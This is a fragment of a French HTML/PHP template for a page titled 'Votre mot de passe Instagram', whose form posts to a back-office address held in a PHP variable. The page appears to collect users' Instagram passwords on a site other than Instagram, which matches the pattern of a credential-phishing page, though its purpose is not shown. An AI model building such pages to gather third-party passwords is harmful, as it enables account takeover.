...
<head>
    <meta charset="utf-8">
    <title>Mot de passe de votre compte Instagram</title>
...
<body data-smooth-scroll-offset="100">
  ...
  <div class="content--wrap">
    ...
    <div class="main-container">
			...
			<center><h3 class="text--logo light color--black">Votre mot de passe Instagram</h3></center>  
			  <div class="container">
				...
				<div class="main2">
				  ...
				  <form role="form" class="form-horizontal" method="post" id="cprofilconf" action="<?php echo "/" . $BACKOFFICE_UPDATE_INSTAGRAM_DEV; ?>">
